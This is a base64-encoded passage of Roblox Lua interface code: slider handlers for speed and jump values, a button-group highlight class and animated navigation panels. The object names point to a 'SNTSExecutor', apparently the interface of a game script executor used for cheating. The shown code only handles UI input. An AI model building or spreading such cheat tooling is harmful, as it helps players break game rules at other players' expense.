haW5lckFic1BvcyA9IHNsaWRlckNvbnRhaW5lci5BYnNvbHV0ZVBvc2l0aW9uCgkgICAgbG9jYWwgY29udGFpbmVyQWJzU2l6ZSA9IHNsaWRlckNvbnRhaW5lci5BYnNvbHV0ZVNpemUKCSAgICBsb2NhbCBtb3VzZVggPSBpbnB1dC5Qb3NpdGlvbi5YCgkKCSAgICAtLSBDbGFtcCBtb3VzZVggdG8gY29udGFpbmVyIGJvdW5kcwoJICAgIGxvY2FsIHJlbGF0aXZlWCA9IG1hdGguY2xhbXAobW91c2VYIC0gY29udGFpbmVyQWJzUG9zLlgsIDAsIGNvbnRhaW5lckFic1NpemUuWCkKCSAgICAtLSBTZXQgc2xpZGVyIHdpZHRoIHRvIG1vdXNlWCBwb3NpdGlvbiAobWluaW11bSB3aWR0aCAxMCkKCSAgICBsb2NhbCBuZXdXaWR0aCA9IG1hdGguY2xhbXAocmVsYXRpdmVYLCAxMCwgY29udGFpbmVyQWJzU2l6ZS5YKQoJICAgIHNsaWRlci5TaXplID0gVURpbTIubmV3KDAsIG5ld1dpZHRoLCBzbGlkZXIuU2l6ZS5ZLlNjYWxlLCBzbGlkZXIuU2l6ZS5ZLk9mZnNldCkKCQoJICAgIGxvY2FsIHZhbHVlID0gZ2V0U2xpZGVyVmFsdWUoKQoJICAgIC0tIHByaW50KCJKdW1wIHNsaWRlciB2YWx1ZToiLCB2YWx1ZSkKCSAgICBpZiB2YWx1ZUxhYmVsIGFuZCB2YWx1ZUxhYmVsOklzQSgiVGV4dExhYmVsIikgdGhlbgoJICAgICAgICB2YWx1ZUxhYmVsLlRleHQgPSB0b3N0cmluZyh2YWx1ZSkKCSAgICBlbmQKCWVuZAoJCgktLSBMaXN0ZW4gZm9yIGNsaWNrL3RvdWNoIG9uIHRoZSBjb250YWluZXIgdG8gc25hcCBzbGlkZXIKCXNsaWRlckNvbnRhaW5lci5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCgkgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIG9yIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4KCSAgICAgICAgc2V0U2xpZGVyV2lkdGhUb0lucHV0KGlucHV0KQoJICAgICAgICBkcmFnZ2luZyA9IHRydWUKCSAgICBlbmQKCWVuZCkKCQoJLS0gQWxzbyBhbGxvdyBkcmFnZ2luZyBieSBob2xkaW5nIG1vdXNlL3RvdWNoCglVc2VySW5wdXRTZXJ2aWNlLklucHV0RW5kZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKCSAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgoJICAgICAgICBkcmFnZ2luZyA9IGZhbHNlCgkgICAgZW5kCgllbmQpCgkKCVVzZXJJbnB1dFNlcnZpY2UuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCgkgICAgaWYgZHJhZ2dpbmcgYW5kIChpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZU1vdmVtZW50IG9yIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoKSB0aGVuCgkgICAgICAgIHNldFNsaWRlcldpZHRoVG9JbnB1dChpbnB1dCkKCSAgICBlbmQKCWVuZCkKCQoJCmVuZDsKdGFzay5zcGF3bihDXzM0KTsKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuU3BlZWQuU3BlZWRTbGlkZXJDb250YWluZXIuU3BlZWRTbGlkZXJGcmFtZS5TcGVlZFNsaWRlclZhbHVlSGFuZGxlcgpsb2NhbCBmdW5jdGlvbiBDXzNmKCkKbG9jYWwgc2NyaXB0ID0gRzJMWyIzZiJdOwoJbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCglsb2NhbCBzbGlkZXIgPSBzY3JpcHQuUGFyZW50Cglsb2NhbCBzbGlkZXJDb250YWluZXIgPSBzbGlkZXIuUGFyZW50CgkKCWxvY2FsIGRyYWdnaW5nID0gZmFsc2UKCQoJLS0gT3B0aW9uYWxseSwgY3JlYXRlIGEgdmFsdWUgbGFiZWwgKGlmIHlvdSB3YW50IHRvIHNob3cgdGhlIHZhbHVlKQoJbG9jYWwgdmFsdWVMYWJlbCA9IHNsaWRlcjpGaW5kRmlyc3RDaGlsZCgiVmFsdWVMYWJlbCIpIC0tIElmIHlvdSBoYXZlIGEgVGV4dExhYmVsIG5hbWVkICJWYWx1ZUxhYmVsIiBpbnNpZGUgc2xpZGVyCgkKCS0tIEhlbHBlciB0byBnZXQgc2xpZGVyIHZhbHVlIG91dCBvZiAxMDAgYmFzZWQgb24gd2lkdGgKCWxvY2FsIGZ1bmN0aW9uIGdldFNsaWRlclZhbHVlKCkKCSAgICBsb2NhbCBjb250YWluZXJBYnNTaXplID0gc2xpZGVyQ29udGFpbmVyLkFic29sdXRlU2l6ZQoJICAgIGxvY2FsIHNsaWRlckFic1NpemUgPSBzbGlkZXIuQWJzb2x1dGVTaXplCgkKCSAgICBsb2NhbCBwZXJjZW50ID0gc2xpZGVyQWJzU2l6ZS5YIC8gY29udGFpbmVyQWJzU2l6ZS5YCgkgICAgcGVyY2VudCA9IG1hdGguY2xhbXAocGVyY2VudCwgMCwgMSkKCSAgICBsb2NhbCB2YWx1ZSA9IG1hdGguZmxvb3IocGVyY2VudCAqIDEwMCArIDAuNSkKCQoJICAgIHJldHVybiB2YWx1ZQoJZW5kCgkKCS0tIEZ1bmN0aW9uIHRvIHNldCBzbGlkZXIgd2lkdGggYmFzZWQgb24gbW91c2UvdG91Y2ggcG9zaXRpb24KCWxvY2FsIGZ1bmN0aW9uIHNldFNsaWRlcldpZHRoVG9JbnB1dChpbnB1dCkKCSAgICBsb2NhbCBjb250YWluZXJBYnNQb3MgPSBzbGlkZXJDb250YWluZXIuQWJzb2x1dGVQb3NpdGlvbgoJICAgIGxvY2FsIGNvbnRhaW5lckFic1NpemUgPSBzbGlkZXJDb250YWluZXIuQWJzb2x1dGVTaXplCgkgICAgbG9jYWwgbW91c2VYID0gaW5wdXQuUG9zaXRpb24uWAoJCgkgICAgLS0gQ2xhbXAgbW91c2VYIHRvIGNvbnRhaW5lciBib3VuZHMKCSAgICBsb2NhbCByZWxhdGl2ZVggPSBtYXRoLmNsYW1wKG1vdXNlWCAtIGNvbnRhaW5lckFic1Bvcy5YLCAwLCBjb250YWluZXJBYnNTaXplLlgpCgkgICAgLS0gU2V0IHNsaWRlciB3aWR0aCB0byBtb3VzZVggcG9zaXRpb24gKG1pbmltdW0gd2lkdGggMTApCgkgICAgbG9jYWwgbmV3V2lkdGggPSBtYXRoLmNsYW1wKHJlbGF0aXZlWCwgMTAsIGNvbnRhaW5lckFic1NpemUuWCkKCSAgICBzbGlkZXIuU2l6ZSA9IFVEaW0yLm5ldygwLCBuZXdXaWR0aCwgc2xpZGVyLlNpemUuWS5TY2FsZSwgc2xpZGVyLlNpemUuWS5PZmZzZXQpCgkKCSAgICBsb2NhbCB2YWx1ZSA9IGdldFNsaWRlclZhbHVlKCkKCSAgICAtLSBwcmludCgiU3BlZWQgc2xpZGVyIHZhbHVlOiIsIHZhbHVlKQoJICAgIGlmIHZhbHVlTGFiZWwgYW5kIHZhbHVlTGFiZWw6SXNBKCJUZXh0TGFiZWwiKSB0aGVuCgkgICAgICAgIHZhbHVlTGFiZWwuVGV4dCA9IHRvc3RyaW5nKHZhbHVlKQoJICAgIGVuZAoJZW5kCgkKCS0tIExpc3RlbiBmb3IgY2xpY2svdG91Y2ggb24gdGhlIGNvbnRhaW5lciB0byBzbmFwIHNsaWRlcgoJc2xpZGVyQ29udGFpbmVyLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKCSAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgoJICAgICAgICBzZXRTbGlkZXJXaWR0aFRvSW5wdXQoaW5wdXQpCgkgICAgICAgIGRyYWdnaW5nID0gdHJ1ZQoJICAgIGVuZAoJZW5kKQoJCgktLSBBbHNvIGFsbG93IGRyYWdnaW5nIGJ5IGhvbGRpbmcgbW91c2UvdG91Y2gKCVVzZXJJbnB1dFNlcnZpY2UuSW5wdXRFbmRlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQoJICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSBvciBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCgkgICAgICAgIGRyYWdnaW5nID0gZmFsc2UKCSAgICBlbmQKCWVuZCkKCQoJVXNlcklucHV0U2VydmljZS5JbnB1dENoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKCSAgICBpZiBkcmFnZ2luZyBhbmQgKGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlTW92ZW1lbnQgb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2gpIHRoZW4KCSAgICAgICAgc2V0U2xpZGVyV2lkdGhUb0lucHV0KGlucHV0KQoJICAgIGVuZAoJZW5kKQoJCgkKZW5kOwp0YXNrLnNwYXduKENfM2YpOwotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUFBOYXZCYXIuQnV0dG9uR3JvdXBFZmZlY3QKbG9jYWwgZnVuY3Rpb24gQ181MygpCmxvY2FsIHNjcmlwdCA9IEcyTFsiNTMiXTsKCS0tW1sKCUJ1dHRvbkdyb3VwRWZmZWN0OiBPT1Agc2NyaXB0IHRvIGhhbmRsZSBidXR0b24gaGlnaGxpZ2h0aW5nIGFuZCBjbGljayBTRlggZm9yIEhvbWUsIEFwcHMsIFNjcmlwdCwgU2V0dGluZ3MKCUF0dGFjaCBhcyBMb2NhbFNjcmlwdCB1bmRlciBDYW52YXNHcm91cAoJLS1dXQoJCglsb2NhbCBDYW52YXNHcm91cCA9IHNjcmlwdC5QYXJlbnQKCWxvY2FsIGJ1dHRvbk5hbWVzID0geyJIb21lIiwgIkFwcHMiLCAiU2NyaXB0IiwgIlNldHRpbmdzIn0KCQoJbG9jYWwgQlVUVE9OX1NFTEVDVEVEX1RSQU5TUEFSRU5DWSA9IDAuMgoJbG9jYWwgQlVUVE9OX0RFRkFVTFRfVFJBTlNQQVJFTkNZID0gMAoJCglsb2NhbCBCVVRUT05fU0ZYX0lEID0gInJieGFzc2V0aWQ6Ly84NzY5Mzk4MzAiIC0tIEV4YW1wbGUgY2xpY2sgc291bmQsIHJlcGxhY2Ugd2l0aCB5b3VyIG93biBpZiBuZWVkZWQKCQoJbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCgkKCWxvY2FsIEJ1dHRvbkdyb3VwID0ge30KCUJ1dHRvbkdyb3VwLl9faW5kZXggPSBCdXR0b25Hcm91cAoJCglmdW5jdGlvbiBCdXR0b25Hcm91cC5uZXcoY2FudmFzR3JvdXAsIGJ1dHRvbk5hbWVzKQoJICAgIGxvY2FsIHNlbGYgPSBzZXRtZXRhdGFibGUoe30sIEJ1dHRvbkdyb3VwKQoJICAgIHNlbGYuY2FudmFzR3JvdXAgPSBjYW52YXNHcm91cAoJICAgIHNlbGYuYnV0dG9ucyA9IHt9CgkgICAgc2VsZi5zZnggPSBuaWwKCSAgICBzZWxmLnNlbGVjdGVkQnV0dG9uID0gbmlsCgkgICAgc2VsZjpfaW5pdEJ1dHRvbnMoYnV0dG9uTmFtZXMpCgkgICAgc2VsZjpfaW5pdFNGWCgpCgkgICAgc2VsZjpfY29ubmVjdElucHV0KCkKCSAgICByZXR1cm4gc2VsZgoJZW5kCgkKCWZ1bmN0aW9uIEJ1dHRvbkdyb3VwOl9pbml0QnV0dG9ucyhuYW1lcykKCSAgICBmb3IgaSA9IDEsICNuYW1lcyBkbwoJICAgICAgICBsb2NhbCBidG5GcmFtZSA9IHNlbGYuY2FudmFzR3JvdXA6RmluZEZpcnN0Q2hpbGQobmFtZXNbaV0pCgkgICAgICAgIGlmIGJ0bkZyYW1lIGFuZCBidG5GcmFtZTpJc0EoIkZyYW1lIikgdGhlbgoJICAgICAgICAgICAgc2VsZi5idXR0b25zWyNzZWxmLmJ1dHRvbnMrMV0gPSBidG5GcmFtZQoJICAgICAgICBlbmQKCSAgICBlbmQKCWVuZAoJCglmdW5jdGlvbiBCdXR0b25Hcm91cDpfaW5pdFNGWCgpCgkgICAgbG9jYWwgc2Z4ID0gSW5zdGFuY2UubmV3KCJTb3VuZCIpCgkgICAgc2Z4Lk5hbWUgPSAiQnV0dG9uQ2xpY2tTRlgiCgkgICAgc2Z4LlNvdW5kSWQgPSBCVVRUT05fU0ZYX0lECgkgICAgc2Z4LlZvbHVtZSA9IDAuNQoJICAgIHNmeC5QYXJlbnQgPSBzZWxmLmNhbnZhc0dyb3VwCgkgICAgc2VsZi5zZnggPSBzZngKCWVuZAoJCglmdW5jdGlvbiBCdXR0b25Hcm91cDpfY29ubmVjdElucHV0KCkKCSAgICBVc2VySW5wdXRTZXJ2aWNlLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCwgcHJvY2Vzc2VkKQoJICAgICAgICBpZiBwcm9jZXNzZWQgdGhlbiByZXR1cm4gZW5kCgkgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSB0aGVuCgkgICAgICAgICAgICBsb2NhbCBtb3VzZVBvcyA9IFVzZXJJbnB1dFNlcnZpY2U6R2V0TW91c2VMb2NhdGlvbigpCgkgICAgICAgICAgICBsb2NhbCBndWlJbnNldCA9IGdhbWU6R2V0U2VydmljZSgiR3VpU2VydmljZSIpOkdldEd1aUluc2V0KCkKCSAgICAgICAgICAgIGxvY2FsIGFkanVzdGVkUG9zID0gVmVjdG9yMi5uZXcobW91c2VQb3MuWCwgbW91c2VQb3MuWSkgLSBndWlJbnNldAoJICAgICAgICAgICAgZm9yIGkgPSAxLCAjc2VsZi5idXR0b25zIGRvCgkgICAgICAgICAgICAgICAgbG9jYWwgYnRuRnJhbWUgPSBzZWxmLmJ1dHRvbnNbaV0KCSAgICAgICAgICAgICAgICBsb2NhbCBhYnNQb3MgPSBidG5GcmFtZS5BYnNvbHV0ZVBvc2l0aW9uCgkgICAgICAgICAgICAgICAgbG9jYWwgYWJzU2l6ZSA9IGJ0bkZyYW1lLkFic29sdXRlU2l6ZQoJICAgICAgICAgICAgICAgIGlmIGFkanVzdGVkUG9zLlggPj0gYWJzUG9zLlggYW5kIGFkanVzdGVkUG9zLlggPD0gYWJzUG9zLlggKyBhYnNTaXplLlggYW5kCgkgICAgICAgICAgICAgICAgICAgYWRqdXN0ZWRQb3MuWSA+PSBhYnNQb3MuWSBhbmQgYWRqdXN0ZWRQb3MuWSA8PSBhYnNQb3MuWSArIGFic1NpemUuWSB0aGVuCgkgICAgICAgICAgICAgICAgICAgIHNlbGY6c2VsZWN0QnV0dG9uKGJ0bkZyYW1lKQoJICAgICAgICAgICAgICAgICAgICBicmVhawoJICAgICAgICAgICAgICAgIGVuZAoJICAgICAgICAgICAgZW5kCgkgICAgICAgIGVuZAoJICAgIGVuZCkKCWVuZAoJCglmdW5jdGlvbiBCdXR0b25Hcm91cDpzZWxlY3RCdXR0b24oYnRuRnJhbWUpCgkgICAgaWYgc2VsZi5zZWxlY3RlZEJ1dHRvbiA9PSBidG5GcmFtZSB0aGVuIHJldHVybiBlbmQKCSAgICBzZWxmLnNlbGVjdGVkQnV0dG9uID0gYnRuRnJhbWUKCQoJICAgIC0tIFJlc2V0IGFsbCBidXR0b25zIHRvIHRoZWlyIGN1cnJlbnQgY29sb3IgYW5kIGRlZmF1bHQgdHJhbnNwYXJlbmN5CgkgICAgZm9yIGkgPSAxLCAjc2VsZi5idXR0b25zIGRvCgkgICAgICAgIGxvY2FsIGJ0biA9IHNlbGYuYnV0dG9uc1tpXQoJICAgICAgICBidG4uQmFja2dyb3VuZENvbG9yMyA9IGJ0bi5CYWNrZ3JvdW5kQ29sb3IzIC0tIGtlZXAgY3VycmVudCBjb2xvcgoJICAgICAgICBidG4uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IEJVVFRPTl9ERUZBVUxUX1RSQU5TUEFSRU5DWQoJICAgIGVuZAoJCgkgICAgLS0gU2V0IHNlbGVjdGVkIGJ1dHRvbiB0cmFuc3BhcmVuY3kgb25seQoJICAgIGJ0bkZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBCVVRUT05fU0VMRUNURURfVFJBTlNQQVJFTkNZCgkKCSAgICAtLSBQbGF5IGNsaWNrIFNGWAoJICAgIGlmIHNlbGYuc2Z4IHRoZW4KCSAgICAgICAgc2VsZi5zZng6UGxheSgpCgkgICAgZW5kCgllbmQKCQoJLS0gSW5pdGlhbGl6ZSBvbiBzY3JpcHQgcnVuCglsb2NhbCBncm91cCA9IEJ1dHRvbkdyb3VwLm5ldyhDYW52YXNHcm91cCwgYnV0dG9uTmFtZXMpCgktLSBPcHRpb25hbGx5IHNlbGVjdCB0aGUgZmlyc3QgYnV0dG9uIGJ5IGRlZmF1bHQKCWlmIGdyb3VwLmJ1dHRvbnNbMV0gdGhlbgoJICAgIGdyb3VwOnNlbGVjdEJ1dHRvbihncm91cC5idXR0b25zWzFdKQoJZW5kCgkKCQplbmQ7CnRhc2suc3Bhd24oQ181Myk7Ci0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLk5hdmlnYXRpb25CdXR0b25IYW5kbGVyCmxvY2FsIGZ1bmN0aW9uIENfMThmKCkKbG9jYWwgc2NyaXB0ID0gRzJMWyIxOGYiXTsKCWxvY2FsIFR3ZWVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIikKCWxvY2FsIFNOVFNFeGVjdXRvciA9IHNjcmlwdC5QYXJlbnQKCWxvY2FsIE5hdmlnYXRvciA9IFNOVFNFeGVjdXRvcjpGaW5kRmlyc3RDaGlsZCgiTmF2aWdhdG9yIikKCWxvY2FsIGJ1dHRvbk5hbWVzID0geyJIb21lIiwgIldpZGdldCIsICJTY3JpcHQiLCAiU2V0dGluZ3MifQoJCgktLSBTZXR0aW5ncwoJbG9jYWwgYmFzZVR3ZWVuSW5UaW1lID0gMC4xOAoJbG9jYWwgYm91bmNlVGltZSA9IDAuMDkKCWxvY2FsIHNldHRsZVRpbWUgPSAwLjA4Cglsb2NhbCB0d2Vlbk91dFRpbWUgPSAwLjE2Cglsb2NhbCByZWNvaWxUaW1lID0gMC4wNwoJCgktLSBTdGF0ZQoJbG9jYWwgb3BlblNlY3Rpb24gPSBuaWwKCWxvY2FsIGlzQW5pbWF0aW5nID0gZmFsc2UKCQoJLS0gRmV0Y2ggY2hpbGRyZW4gKHNwZWNpYWwgY2FzZSBmb3IgU2NyaXB0ID4gQ01EKQoJbG9jYWwgZnVuY3Rpb24gZ2V0R3VpQ2hpbGRyZW4oZm9sZGVyKQoJCWlmIG5vdCBmb2xkZXIgdGhlbiByZXR1cm4ge30gZW5kCgkJaWYgZm9sZGVyLk5hbWUgPT0gIlNjcmlwdCIgdGhlbgoJCQlsb2NhbCBjbWRGcmFtZSA9IGZvbGRlcjpGaW5kRmlyc3RDaGlsZCgiQ01EIikKCQkJaWYgbm90IGNtZEZyYW1lIHRoZW4KCQkJCS0tIHdhcm4oIltOYXZpZ2F0aW9uQnV0dG9uSGFuZGxlcl0gQ01EIGZyYW1lIG5vdCBmb3VuZCBpbiBTY3JpcHQgZm9sZGVyIikKCQkJCXJldHVybiB7fQoJCQllbmQKCQkJLS0gRW5zdXJlIENNRCBpcyB2aXNpYmxlIHdoZW4gb3BlbmluZyBTY3JpcHQKCQkJY21kRnJhbWUuVmlzaWJsZSA9IHRydWUKCQkJbG9jYWwgcmVzdWx0ID0ge30KCQkJZm9yIGksIGd1aSBpbiBjbWRGcmFtZTpHZXRDaGlsZHJlbigpIGRvCgkJCQlpZiBndWk6SXNBKCJHdWlPYmplY3QiKSB0aGVuCgkJCQkJdGFibGUuaW5zZXJ0KHJlc3VsdCwgZ3VpKQoJCQkJZW5kCgkJCWVuZAoJCQlyZXR1cm4gcmVzdWx0CgkJZWxzZQoJCQlsb2NhbCByZXN1bHQgPSB7fQoJCQlmb3IgaSwgZ3VpIGluIGZvbGRlcjpHZXRDaGlsZHJlbigpIGRvCgkJCQlpZiBndWk6SXNBKCJHdWlPYmplY3QiKSB0aGVuCgkJCQkJdGFibGUuaW5zZXJ0KHJlc3VsdCwgZ3VpKQoJCQkJZW5kCgkJCWVuZAoJCQlyZXR1cm4gcmVzdWx0CgkJZW5kCgllbmQKCQoJLS0gVHdlZW4gSW4KCWxvY2FsIGZ1bmN0aW9uIHR3ZWVuSW4oZm9sZGVyKQoJCWlmIGZvbGRlci5OYW1lID09ICJTY3JpcHQiIHRoZW4KCQkJbG9jYWwgY21kRnJhbWUgPSBmb2xkZXI6RmluZEZpcnN0Q2hpbGQoIkNNRCIpCgkJCWlmIGNtZEZyYW1lIHRoZW4KCQkJCWNtZEZyYW1lLlZpc2libGUgPSB0cnVlCgkJCQktLSBwcmludCgiW05hdmlnYXRpb25CdXR0b25IYW5kbGVyXSBDTUQgZnJhbWUgc2V0IHRvIFZpc2libGUiKQoJCQllbmQKCQllbmQKCQlmb3IgaSwgZ3VpIGluIGdldEd1aUNoaWxkcmVuKGZvbGRlcikgZG8KCQkJZ3VpLlZpc2libGUgPSB0cnVlCgkJCWxvY2FsIG9yaWdQb3MgPSBndWkuUG9zaXRpb24KCQkJbG9jYWwgc3RhcnRQb3MgPSBVRGltMi5uZXcob3JpZ1Bvcy5YLlNjYWxlIC0gMSwgb3JpZ1Bvcy5YLk9mZnNldCAtIDIwMCwgb3JpZ1Bvcy5ZLlNjYWxlLCBvcmlnUG9zLlkuT2Zmc2V0KQoJCQlndWkuUG9zaXRpb24gPSBzdGFydFBvcwoJCgkJCWxvY2FsIHR3ZWVuVGltZSA9IGJhc2VUd2VlbkluVGltZSArIChpIC0gMSkgKiAwLjAzCgkJCWxvY2FsIHR3ZWVuSW4gPSBUd2VlblNlcnZpY2U6Q3JlYXRlKGd1aSwgVHdlZW5JbmZvLm5ldyh0d2VlblRpbWUsIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1Bvc2l0aW9uID0gb3JpZ1Bvc30pCgkJCXR3ZWVuSW46UGxheSgpCgkKCQkJdHdlZW5Jbi5Db21wbGV0ZWQ6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlsb2NhbCBib3VuY2VQb3MgPSBVRGltMi5uZXcob3JpZ1Bvcy5YLlNjYWxlLCBvcmlnUG9zLlguT2Zmc2V0ICsgMTIsIG9yaWdQb3MuWS5TY2FsZSwgb3JpZ1Bvcy5ZLk9mZnNldCkKCQkJCWxvY2FsIGJvdW5jZSA9IFR3ZWVuU2VydmljZTpDcmVhdGUoZ3VpLCBUd2VlbkluZm8ubmV3KGJvdW5jZVRpbWUsIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1Bvc2l0aW9uID0gYm91bmNlUG9zfSkKCQkJCWJvdW5jZTpQbGF5KCkKCQkJCWJvdW5jZS5Db21wbGV0ZWQ6Q29ubmVjdChmdW5jdGlvbigpCgkJCQkJbG9jYWwgc2V0dGxlID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShndWksIFR3ZWVuSW5mby5uZXcoc2V0dGxlVGltZSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5JbiksIHtQb3NpdGlvbiA9IG9yaWdQb3N9KQoJCQkJCXNldHRsZTpQbGF5KCkKCQkJCWVuZCkKCQkJZW5kKQoJCWVuZAoJZW5kCgkKCS0tIHR3ZWVuIG91dAoJbG9jYWwgZnVuY3Rpb24gdHdlZW5PdXQoZm9sZGVyKQoJCWlmIGZvbGRlci5OYW1lID09ICJTY3JpcHQiIHRoZW4KCQkJbG9jYWwgY21kRnJhbWUgPSBmb2xkZXI6RmluZEZpcnN0Q2hpbGQoIkNNRCIpCgkJCWlmIGNtZEZyYW1lIHRoZW4KCQkJCWNtZEZyYW1lLlZpc2libGUgPSBmYWxzZQoJCQkJLS0gcHJpbnQoIltOYXZpZ2F0aW9uQnV0dG9uSGFuZGxlcl0gQ01EIGZyYW1lIHNldCB0byBOT1QgVmlzaWJsZSIpCgkJCWVuZAoJCWVuZAoJCWZvciBpLCBndWkgaW4gZ2V0R3VpQ2hpbGRyZW4oZm9sZGVyKSBkbwoJCQlsb2NhbCBvcmlnUG9zID0gZ3VpLlBvc2l0aW9uCgkJCWxvY2FsIG91dFBvcyA9IFVEaW0yLm5ldyhvcmlnUG9zLlguU2NhbGUgLSAxLCBvcmlnUG9zLlguT2Zmc2V0IC0gMjAwLCBvcmlnUG9zLlkuU2NhbGUsIG9yaWdQb3MuWS5PZmZzZXQpCgkJCWxvY2FsIHJlY29pbFBvcyA9IFVEaW0yLm5ldyhvcmlnUG9zLlguU2NhbGUsIG9yaWdQb3MuWC5PZmZzZXQgLSAxMiwgb3JpZ1Bvcy5ZLlNjYWxlLCBvcmlnUG9zLlkuT2Zmc2V0KQoJCgkJCWxvY2FsIHR3ZWVuVGltZSA9IHR3ZWVuT3V0VGltZSArIChpIC0gMSkgKiAwLjAyNQoJCQlsb2NhbCByZWNvaWwgPSBUd2VlblNlcnZpY2U6Q3JlYXRlKGd1aSwgVHdlZW5JbmZvLm5ldyhyZWNvaWxUaW1lLCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtQb3NpdGlvbiA9IHJlY29pbFBvc30pCgkJCXJlY29pbDpQbGF5KCkKCQkJcmVjb2lsLkNvbXBsZXRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCWxvY2FsIHR3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShndWksIFR3ZWVuSW5mby5uZXcodHdlZW5UaW1lLCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLkluKSwge1Bvc2l0aW9uID0gb3V0UG9zfSkKCQkJCXR3ZWVuOlBsYXkoKQoJCQkJdHdlZW4uQ29tcGxldGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJCWd1aS5WaXNpYmxlID0gZmFsc2UKCQkJCQlndWkuUG9zaXRpb24gPSBvcmlnUG9zCgkJCQllbmQpCgkJCWVuZCkKCQllbmQKCWVuZAoJCgktLSBIaWRlIGFsbCBleGNlcHQgb25lCglsb2NhbCBmdW5jdGlvbiBoaWRlQWxsRm9sZGVycyhleGNlcHROYW1lKQoJCWZvciBpLCBuYW1lIGluIGJ1dHRvbk5hbWVzIGRvCgkJCWxvY2FsIGZvbGRlciA9IFNOVFNFeGVjdXRvcjpGaW5kRmlyc3RDaGlsZChuYW1lKQoJCQlpZiBmb2xkZXIgYW5kIGZvbGRlcjpJc0EoIkZvbGRlciIpIGFuZCBuYW1lIH49IGV4Y2VwdE5hbWUgdGhlbgoJCQkJdHdlZW5PdXQoZm9sZGVyKQoJCQllbmQKCQllbmQKCQktLSBBbHNvIGhpZGUgQ01EIGZyYW1lIGlmIG5vdCBTY3JpcHQKCQlpZiBleGNlcHROYW1lIH49ICJTY3JpcHQiIHRoZW4KCQkJbG9jYWwgc2NyaXB0Rm9sZGVyID0gU05UU0V4ZWN1dG9yOkZpbmRGaXJzdENoaWxkKCJTY3JpcHQiKQoJCQlpZiBzY3JpcHRGb2xkZXIgdGhlbgoJCQkJbG9jYWwgY21kRnJhbWUgPSBzY3JpcHRGb2xkZXI6RmluZEZpcnN0Q2hpbGQoIkNNRCIpCgkJCQlpZiBjbWRGcmFtZSB0aGVuCgkJCQkJY21kRnJhbWUuVmlzaWJsZSA9IGZhbHNlCgkJCQkJLS0gcHJpbnQoIltOYXZpZ2F0aW9uQnV0dG9uSGFuZGxlcl0gQ01EIGZyYW1lIGhpZGRlbiAobm90IFNjcmlwdCBzZWN0aW9uKSIpCgkJCQllbmQKCQkJZW5kCgkJZW5kCgllbmQKCQoJLS0gQnV0dG9uIGNsaWNrIGhhbmRsZXIKCWxvY2FsIGZ1bmN0aW9uIG9uTmF2QnV0dG9uQ2xpY2soYnV0dG9uTmFtZSkKCQlpZiBpc0FuaW1hdGluZyB0aGVuIHJldHVybiB